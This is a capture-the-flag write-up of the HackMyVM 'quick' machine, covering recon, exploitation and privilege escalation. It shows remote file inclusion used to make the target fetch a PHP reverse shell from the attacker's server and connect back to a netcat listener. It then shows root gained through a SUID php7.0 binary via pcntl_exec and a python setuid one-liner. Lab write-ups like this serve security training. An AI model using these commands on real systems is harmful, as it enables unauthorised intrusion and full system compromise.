# quick

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| quick | eMVee | Beginner | HackMyVM |

**Summary:** The exploitation of the Quick machine began with a comprehensive reconnaissance phase that identified an Apache web server hosting a dynamic automotive website. Investigation of the web application revealed a critical Remote File Inclusion vulnerability within the page parameter of the PHP scripts, allowing for the execution of arbitrary remote code. By hosting a PHP reverse shell on an external server and forcing the target to include it, initial access was gained as the service user. Following successful TTY stabilization, system enumeration uncovered a significant misconfiguration where the PHP 7.0 binary was assigned the SUID bit and owned by the root user. This allowed for an immediate escalation of privileges to root by utilizing the PHP pcntl_exec function to spawn a privileged shell, ultimately leading to the full compromise of the system and the retrieval of both user and root flags.

---

## Reconnaissance

The initial phase involved scanning the local network to identify the target IP address. A custom PowerShell script was utilized to locate active hosts in the virtual environment.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.200 08:00:27:41:D3:56 VirtualBox
```

Once the target IP address 192.168.100.200 was confirmed, a comprehensive Nmap scan was performed to identify open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick]
└─$ nmap -sC -sV -p- -T4 192.168.100.200
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 11:30 WIB
Nmap scan report for 192.168.100.200
Host is up (0.0051s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Quick Automative
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.80 seconds
```

The scan revealed only port 80 was open, running an Apache web server. Directory enumeration was then conducted using Gobuster to map out the web application structure.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick]
└─$ gobuster dir -u http://192.168.100.200/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.200/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3735]
/images               (Status: 301) [Size: 319] [--> http://192.168.100.200/images/]
/about.php            (Status: 200) [Size: 1446]
/contact.php          (Status: 200) [Size: 1395]
/home.php             (Status: 200) [Size: 2534]
/cars.php             (Status: 200) [Size: 1502]
/connect.php          (Status: 500) [Size: 0]
```

## Vulnerability Discovery

While navigating the website, the presence of a "page" parameter in the URL suggested a potential File Inclusion vulnerability.

![](image.png)

Initial tests for Local File Inclusion did not provide any useful data. Therefore, the focus shifted to testing for Remote File Inclusion by attempting to make the server request a file from an external source.

![](image-1.png)

To verify the Remote File Inclusion vulnerability, a local HTTP server was started to monitor for incoming requests from the target.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

The target successfully requested the test file, confirming that the application was vulnerable to Remote File Inclusion.

![](image-2.png)

The logs on the local server showed the successful GET request from the target IP.

```bash
172.20.128.1 - - [16/May/2026 11:48:18] "GET /test.txt?.php HTTP/1.0" 200 -
```

## Exploitation

With Remote File Inclusion confirmed, the next step was to achieve Remote Code Execution. A standard PHP reverse shell was prepared for this purpose.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick]
└─$ vim php-reverse-shell.php
```

A local HTTP server was set up to host the payload, and a Netcat listener was started to receive the connection from the target machine.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The reverse shell was triggered by passing the URL of the hosted payload to the vulnerable parameter.

![](image-3.png)

The payload was successfully requested by the target server.

```bash
172.20.128.1 - - [16/May/2026 11:57:09] "GET /php-reverse-shell.php HTTP/1.0" 200 -
```

The Netcat listener received the connection, providing a shell as the www-data user.

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 55398
Linux quick 5.4.0-169-generic #187-Ubuntu SMP Thu Nov 23 14:52:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 04:57:07 up 28 min,  0 users,  load average: 0.01, 0.13, 0.89
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

The shell was then stabilized to provide a full interactive TTY environment.

```bash
$ which script
/usr/bin/script
$ script -qc /bin/bash /dev/null
www-data@quick:/$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@quick:/$ export SHELL=/bin/bash
www-data@quick:/$ export TERM=xterm
```

## Internal Enumeration

Basic enumeration of the home directories revealed a user named Andrew.

```bash
www-data@quick:/$ ls -la home/andrew/
total 48
drwxr-xr-x 7 andrew andrew 4096 Dec 16  2023 .
drwxr-xr-x 3 root   root   4096 Dec 16  2023 ..
-rw------- 1 andrew andrew   75 Dec 16  2023 .bash_history
-rw-r--r-- 1 andrew andrew  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 andrew andrew 3771 Feb 25  2020 .bashrc
drwx------ 2 andrew andrew 4096 Dec 16  2023 .cache
drwx------ 3 andrew andrew 4096 Dec 16  2023 .gnupg
drwxrwxr-x 3 andrew andrew 4096 Dec 16  2023 .local
-rw-r--r-- 1 andrew andrew  807 Feb 25  2020 .profile
drwx------ 2 andrew andrew 4096 Dec 16  2023 .ssh
-rw-r--r-- 1 andrew andrew    0 Dec 16  2023 .sudo_as_admin_successful
drwx------ 3 andrew andrew 4096 Dec 16  2023 snap
-rw-rw-r-- 1 andrew andrew 1102 Dec 16  2023 user.txt
```

Searching for SUID binaries identified an unusual entry for the PHP 7.0 binary.

```bash
www-data@quick:/$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /snap/core20/1828/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /snap/core20/1828/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /snap/core20/1828/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Feb  7  2022 /snap/core20/1828/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /snap/core20/1828/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /snap/core20/1828/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Feb  7  2022 /snap/core20/1828/usr/bin/su
-rwsr-xr-x 1 root root 166056 Jan 16  2023 /snap/core20/1828/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Feb  7  2022 /snap/core20/1828/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Oct 25  2022 /snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Mar 30  2022 /snap/core20/1828/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 123560 Jan 25  2023 /snap/snapd/18357/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 473576 Aug  4  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 146888 May 29  2023 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Feb  7  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 55528 Feb  7  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 67816 Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 4537352 Sep  2  2023 /usr/bin/php7.0
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
```

The PHP binary located at /usr/bin/php7.0 had the SUID bit set, which is a major security risk as it can be used to execute commands with root privileges.

```bash
www-data@quick:/$ ls -la /usr/bin/php7.0
-rwsr-xr-x 1 root root 4537352 Sep  2  2023 /usr/bin/php7.0
www-data@quick:/$
```

## Privilege Escalation

According to GTFOBins, a PHP binary with the SUID bit can be exploited to obtain a root shell.

![](image-4.png)

The exploit was executed by using the pcntl_exec function to spawn a new shell while maintaining the effective user ID of root.

```bash
www-data@quick:/$ php7.0 -r 'pcntl_exec("/bin/sh", ["-p"]);'
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@quick:/# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@quick:/# su -
root@quick:~# id
uid=0(root) gid=0(root) groups=0(root)
root@quick:~# whoami;hostname
root
quick
root@quick:~# cat /root/root.txt


            ___.............___
         ,dMMMMMMMMMMMMMMMMMMMMMb.
        dMMMMMMMMMMMMMMMMMMMMMMMMMb
        |        | -_  - |        |
        |        |_______|___     |
        |     ___......./'.__`\   |
        |_.-~"               `"~-.|
        7\         _...._        |`.
       /  l     .-'      `-.     j  \
      :   .qp. / __________ \ .qp.   :
      |  d8888b |          | d8888b  |
  .---:  `Y88P|_|__________|_|Y88P'\/`"-.
 /     : /,------------------------.:    \
:      |`.    | | [_FLAG_] ||     ,'|     :
`\.____|  `.  : `.________.'|   ,'  |____.'
  MMMMM|   |  |`-.________.-|  /    |MMMMM
 .-------------`------------'-'-----|-----.
(___HMV{6ff[REDACTED]}__)
  MMMMMM                            MMMMMM
  `MMMM'                            `MMMM'


root@quick:~# cat /home/andrew/user.txt


                                 _________
                          _.--""'-----,   `"--.._
                       .-''   _/_      ; .'"----,`-,
                     .'      :___:     ; :      ;;`.`.
                    .      _.- _.-    .' :      ::  `..
                 __;..----------------' :: ___  ::   ;;
            .--"". '           ___.....`:=(___)-' :--'`.
          .'   .'         .--''__       :       ==:    ;
      .--/    /        .'.''     ``-,   :         :   '`-.
   ."', :    /       .'-`\\       .--.\ :         :  ,   _\
  ;   ; |   ;       /:'  ;;      /__  \\:         :  :  /_\\
  |\_/  |   |      / \__//      /"--\\ \:         :  : ;|`\|
  : "  /\__/\____//   """      /     \\ :         :  : :|'||
["""""""""--------........._  /      || ;      __.:--' :|//|
 "------....______         ].'|      // |--"""'__...-'`\ \//
   `|HMV{QUI[REDACTED]}|.--'": :  \    //  |---"""      \__\_/
     """""""""'            \ \  \_.//  /
       `---'                \ \_     _'
                             `--`---'
```

---

## Attack Chain Summary
1. **Reconnaissance**: Scanning the network for targets and performing port and directory discovery on the identified host.
2. **Vulnerability Discovery**: Identifying a potential Remote File Inclusion vulnerability in a dynamic web page parameter and confirming it with a remote request.
3. **Exploitation**: Leveraging the Remote File Inclusion vulnerability to execute a PHP reverse shell, gaining initial access to the system.
4. **Internal Enumeration**: Inspecting the file system and identifying a misconfigured PHP binary with SUID permissions.
5. **Privilege Escalation**: Exploiting the SUID PHP binary to spawn a root shell and achieve full system compromise.

